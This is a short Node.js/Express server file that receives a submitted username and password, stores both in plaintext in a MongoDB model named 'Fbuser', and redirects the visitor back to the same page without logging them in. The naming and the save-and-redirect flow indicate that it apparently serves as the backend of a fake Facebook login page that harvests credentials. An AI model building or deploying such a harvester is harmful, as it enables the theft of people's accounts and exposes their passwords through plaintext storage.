require('dotenv').config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
 
app = express();
app.use(bodyParser.urlencoded({
    extended: true
  })); 
app.use(express.static(__dirname+"/public"));

mongoose.connect(process.env.MONGODB_LINK, { useNewUrlParser: true, useUnifiedTopology:true});
mongoose.set("useCreateIndex",true);
 

const userSchema = new mongoose.Schema({ 
    username: String,
    password: String
});
const User = new mongoose.model("Fbuser", userSchema);


app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

app.post("/", (req, res) => { 
    const user = new User({
        username: req.body.username,
        password: req.body.password
    });
    user.save();
    res.redirect("/");
});

app.listen(process.env.PORT, ()=>{
    console.log("Server started");
})